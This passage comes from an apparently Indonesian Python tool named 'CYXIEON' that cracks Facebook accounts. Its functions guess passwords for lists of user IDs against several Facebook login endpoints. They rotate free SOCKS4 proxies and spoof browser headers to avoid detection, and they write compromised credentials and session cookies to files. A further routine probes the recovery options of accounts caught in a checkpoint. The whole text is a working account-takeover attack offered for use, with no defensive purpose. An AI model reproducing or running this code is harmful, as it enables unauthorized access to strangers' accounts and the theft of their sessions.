				tree.add(f"{hijo}{kuki}{puti}").add(f"{mer}{ua}{puti}")
				print(f"{kun}╰────────────────────────────╯{puti}")
				prints(tree)
				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
				break			
			elif "checkpoint" in po.cookies.get_dict().keys():
				print(f"{kun}╭────────────────────────────╮{puti}")
				tree = Tree("")
				tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}")
				tree.add(f"{mer}{tahun(idf)}{puti}").add(f"{mer}{ua}{puti}")
				print(f"{kun}╰────────────────────────────╯{puti}")
				prints(tree)
				open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
				akune.append(idf+'|'+pw)
				ceker(idf,pw)
				cp+=1
				break	
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	

#----------[ METODE-REGULER ]----------#	
def crackreguler(idf,pwx,url):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	emot = rc(["🌻","🌻","😁"])
	prog.update(des,description=f"\r {emot} REGULER (%s OK : {ok} %s) (%s CP : {cp} %s) (%s {loop} %s) "%(hijo,puti,kun,puti,hijo,puti))
	prog.advance(des)
	for pw in pwx:
		try:
			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
			open('socksku.txt','w').write(proxs)
			nip = rc(proxs)
			proxs = {'http': 'socks4://'+nip}
			ua = rc(ugen)
			ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
			ver = rc(["en-GB,en-US;q=0.9","ms-MY,ms;q=0.9","fr_FR,fr;q=0.9","jv-ID,jv;q=0.9"])  		
			ses.headers.update({"Host":url,
			"upgrade-insecure-requests":"1",
			"user-agent":ua,
			"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"dnt":f"{str(rr(1,9))}",
			"x-requested-with":"mark.via.gp",
			"sec-fetch-site":"same-origin",
			"sec-fetch-mode":"cors",
			"sec-fetch-user":"empty",
			"sec-fetch-dest":"document",
			"referer":f"https://{url}/",
			"accept-encoding":"gzip, deflate br",
			"accept-language":f"{ver},en;q=0.8"})
			link = ses.get('https://m.facebook.com/login/?email='+idf).text
			date = {'lsd':re.search('name="lsd" value="(.*?)"', str(link)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', str(link)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
'li':re.search('name="li" value="(.*?)"', str(link)).group(1),'email':idf,'pass':pw}
			ses.headers.update({'Host': url,
			'cache-control': 'max-age=0',
			'upgrade-insecure-requests': '1',
			'origin': 'https://'+url,
			'content-type': 'application/x-www-form-urlencoded',
			'user-agent': ua,
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'sec-fetch-site': 'same-origin',
			'sec-fetch-mode': 'cors',
			'sec-fetch-user': 'empty',
			'sec-fetch-dest': 'document',
			'referer': f'https://{url}/login/?email='+idf,
			'accept-encoding':'gzip, deflate br',
			'accept-language':f'{ver},en;q=0.8'})
			links = rc([f"https://{url}/login/login/device-based/regular/login/?shbl=1&refsrc=deprecated"])
			CYXIEON_XR = ses.post(links,data=date,allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=CYXIEON_XR.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f"{kun}╭────────────────────────────╮{puti}")
				tree = Tree("")
				tree.add(f"\r{hijo}{idf}{puti}").add(f"{hijo}{pw}{puti}").add(f"{mer}{tahun(idf)}{puti}")
				tree.add(f"{hijo}{kuki}{puti}").add(f"{mer}{ua}{puti}")
				print(f"{kun}╰────────────────────────────╯{puti}")
				prints(tree)
				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
				break			
			elif "checkpoint" in CYXIEON_XR.cookies.get_dict().keys():
				print(f"{kun}╭────────────────────────────╮{puti}")
				tree = Tree("")
				tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}")
				tree.add(f"{mer}{tahun(idf)}{puti}").add(f"{mer}{ua}{puti}")
				print(f"{kun}╰────────────────────────────╯{puti}")
				prints(tree)
				open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
				akune.append(idf+'|'+pw)
				ceker(idf,pw)
				cp+=1
				break	
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#----------[ METODE-ASYINC ]----------#	
def crackasyinc(idf,pwx,url):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	emot = rc(["💋","😜","💋"])
	prog.update(des,description=f"\r {emot} ASYINC (%s OK : {ok} %s) (%s CP : {cp} %s) (%s {loop} %s) "%(hijo,puti,kun,puti,hijo,puti))
	prog.advance(des)
	for pw in pwx:
		try:
			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
			open('socksku.txt','w').write(proxs)
			nip = rc(proxs)
			proxs = {'http': 'socks4://'+nip}
			ua = rc(ugen)
			ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
			ua3 = rc([" Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 seperti Mac OS X) AppleWebKit/605.1.15 (KHTML, seperti Gecko) Versi/16.3 Seluler/15E148"])
			ua3 =rc(["Mozilla/5.0 (Linux; U; Android 9; in-id; CPH2071 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"])
			ua4 =rc(["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/110.0.0.0 Safari/537.36"])
			ua5 =rc(["Mozilla/5.0 (Symbian/3; Series60/Nokia/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/Mobile Safari/535.1"])
			ua6 =rc(["Mozilla/5.0 (Linux; U; Android 2.3.5; 7; it-de; HTC/Explorer/1.17.161.3Build/GRJ90; wv)J998E) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0Chrome/80.0.4350.67 Mobile Safari/537.36[FB_IAB/Orca-Android;FBAV/264.0.0.23.120;]"])
			ua7 =rc(["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"])
			ua8 =rc(["viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .{str(rr(1,20))}; WOW64){str(rc(gt))})Applewebkit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Safari/537.36 Vivaldi/6.0.2979.18"])
			ua9 =rc(['Mozilla/5.0 (Linux; Android 4.0.4 12; Galaxy Nexus Build/IMM76B)AppleWebKit/537.36 (KHTML, like Gecko; Mediapartners-Google) Chrome/81.0.4875.43Mobile Safari/537.36'])
			ref = rc([f"https://{url}/login.php?skip_api_login=1&api_key=266809897176355&kid_directed_site=0&app_id=266809897176355&signed_next=1&next=https%3A%2F%2F{url}%2Fv7.0%2Fdialog%2Foauth%3Fapp_id%3D266809897176355%26cbt%3D1694956577376%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df26dedb14c84ab%2526domain%253Dwww.signupgenius.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.signupgenius.com%25252Ff1e4e76b83b13a%2526relation%253Dopener%26client_id%3D266809897176355%26display%3Dtouch%26domain%3Dwww.signupgenius.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.signupgenius.com%252Fregister%26locale%3Den_US%26logger_id%3Df2de2085933efa%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2785f21139e0cc%2526domain%253Dwww.signupgenius.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.signupgenius.com%25252Ff1e4e76b83b13a%2526relation%253Dopener%2526frame%253Df380e29c31da6c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv7.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2785f21139e0cc%26domain%3Dwww.signupgenius.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.signupgenius.com%252Ff1e4e76b83b13a%26relation%3Dopener%26frame%3Df380e29c31da6c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr"])
			link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=266809897176355&kid_directed_site=0&app_id=266809897176355&signed_next=1&next=https%3A%2F%2F{url}%2Fv7.0%2Fdialog%2Foauth%3Fapp_id%3D266809897176355%26cbt%3D1694956577376%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df26dedb14c84ab%2526domain%253Dwww.signupgenius.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.signupgenius.com%25252Ff1e4e76b83b13a%2526relation%253Dopener%26client_id%3D266809897176355%26display%3Dtouch%26domain%3Dwww.signupgenius.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.signupgenius.com%252Fregister%26locale%3Den_US%26logger_id%3Df2de2085933efa%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2785f21139e0cc%2526domain%253Dwww.signupgenius.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.signupgenius.com%25252Ff1e4e76b83b13a%2526relation%253Dopener%2526frame%253Df380e29c31da6c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv7.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2785f21139e0cc%26domain%3Dwww.signupgenius.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.signupgenius.com%252Ff1e4e76b83b13a%26relation%3Dopener%26frame%3Df380e29c31da6c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			date = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),'try_number': '0','unrecognized_tries': '0','email': idf,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '',
			'had_cp_prefilled': 'false',
			'had_password_prefilled': 'false',
			'is_smart_lock': 'true',
			'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1),'pass': pw,'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
			"__dyn": "",
			"__csr": "",
			"__req": rc(["1","2","3","4","5","6","7","8","9","0","a","b","c","d","f","g","h","i","j","k","l","m","n","n","o","p","q"]),
			"__a": "",
			"__user": "ugen",
			"_fb_noscript": "true"}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			ver = rc(["id-ID,id;q=0.9","ms-MY,ms;q=0.9","fr_FR,fr;q=0.9","jv-ID,jv;q=0.9"])  
			head = {"Host": url,
			"content-length": f"str(rr(2000,2999))",
			"sec-ch-ua": f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(110,114))}", "Google Chrome";v="{str(rr(110,114))}"',
			"sec-ch-ua-mobile": "?1",
			"user-agent": ua,
			"viewport-width": f"str(rr(400,989)",
			"content-type": "application/x-www-form-urlencoded",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
			"sec-ch-ua-platform-version": f'"{str(rr(7,14))}.0.0"',
			"x-asbd-id": "129477",
			"x-requested-with": "XMLHttpRequest",
			"sec-ch-ua-full-version-list": f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(110,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(110,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
			"sec-ch-prefers-color-scheme": "light",
			"sec-ch-ua-platform": '"Android"',
			"accept": "*/*",
			"origin": "https://"+url,
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"referer": ref,
			"accept-encoding": "gzip, deflate, br",
			"accept-language": ver}		
			links = rc([f"https://{url}/login/device-based/login/async/?api_key=266809897176355&auth_token=9e74c10df302b317fb711eeb7b478dc4&skip_api_login=1&signed_next=1&next=https%3A%2F%2F{url}%2Fv7.0%2Fdialog%2Foauth%3Fapp_id%3D266809897176355%26cbt%3D1694956577376%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df26dedb14c84ab%2526domain%253Dwww.signupgenius.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.signupgenius.com%25252Ff1e4e76b83b13a%2526relation%253Dopener%26client_id%3D266809897176355%26display%3Dtouch%26domain%3Dwww.signupgenius.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.signupgenius.com%252Fregister%26locale%3Den_US%26logger_id%3Df2de2085933efa%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2785f21139e0cc%2526domain%253Dwww.signupgenius.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.signupgenius.com%25252Ff1e4e76b83b13a%2526relation%253Dopener%2526frame%253Df380e29c31da6c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv7.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=266809897176355&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2785f21139e0cc%26domain%3Dwww.signupgenius.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.signupgenius.com%252Ff1e4e76b83b13a%26relation%3Dopener%26frame%3Df380e29c31da6c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100"])
			CYXIEON_XR = ses.post(links,headers=head, data=date, cookies={'cookie': koki}, allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=CYXIEON_XR.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f"{kun}╭────────────────────────────╮{puti}")
				tree = Tree("")
				tree.add(f"\r{hijo}{idf}{puti}").add(f"{hijo}{pw}{puti}").add(f"{mer}{tahun(idf)}{puti}")
				tree.add(f"{hijo}{kuki}{puti}").add(f"{mer}{ua}{puti}")
				print(f"{kun}╰────────────────────────────╯{puti}")
				prints(tree)
				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
				break			
			elif "checkpoint" in CYXIEON_XR.cookies.get_dict().keys():
				print(f"{kun}╭────────────────────────────╮{puti}")
				tree = Tree("")
				tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}")
				tree.add(f"{mer}{tahun(idf)}{puti}").add(f"{mer}{ua}{puti}")
				print(f"{kun}╰────────────────────────────╯{puti}")
				prints(tree)
				open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
				akune.append(idf+'|'+pw)
				ceker(idf,pw)
				cp+=1
				break	
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#----------[ CEK-OPSI ]----------#	
def ceker(idf,pw):
	global cp
	rc = random.choice
	url = rc(["free.facebook.com","m.facebook.com","mbasic.facebook.com","m.prod.facebook.com","x.facebook.com"])
	head = {"Host": url,
	"cache-control": "max-age=0",
	"upgrade-insecure-requests": "1",
	"origin": "https://"+url,
	"content-type": "application/x-www-form-urlencoded",
	"user-agent": "Mozilla/5.0 (Linux; Android 10; DOOGEE B10 Build/KOTG49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
	"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	"x-requested-with": "com.android.chrome",
	"sec-fetch-site": "same-origin",
	"sec-fetch-mode": "navigate",
	"sec-fetch-user": "?1",
	"sec-fetch-dest": "document",
	"referer": f"https://{url}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
	"accept-encoding": "gzip, deflate",
	"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://'+url)
		kontol = sop(ses.post(
		'https://'+url+'/login.php',
		data={
		'email':idf,
	'pass':pw,
'login':'submit'
		},headers=head, allow_redirects=True).text,'html.parser')
		jo = kontol.find(
		'form'
		)
		data = {}
		lion = [
		'nh',
	'jazoest',
'fb_dtsg',
	'submit[Continue]',
		'checkpoint_data'
		]
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://'+url+str(jo['action']), data=data, headers=head).text,'html.parser')
		opsi = kent.find_all('option')
		if len(opsi)==0:
			tree = Tree("")
			tree.add(f"{hijo}Anda kurang beruntung {puti}")
			prints(tree)
			#open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
			#cp+=1
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		tree = Tree("")
		tree.add(f"{hijo}{idf}{puti}").add(f"{hijo}{pw}{puti}")
		tree.add(f"{mer}Akun aktif {puti}")
		prints(tree)
		#open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
		#cp+=1
		
#----------[ SYSTEM-CONTROL ]----------#	
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('CYXIEON-OK')
	except:pass
	try:os.mkdir('CYXIEON-CP')
	except:pass
	menu()
	
	
#>>>>> THANKS TO <<<<<#

#    *--> BASARI ID
#    *--> ALVINO ADIJAYA
#    *--> AOREC-XD
#    *--> Asep Yusup

#>>>>> THANKS TO <<<<<#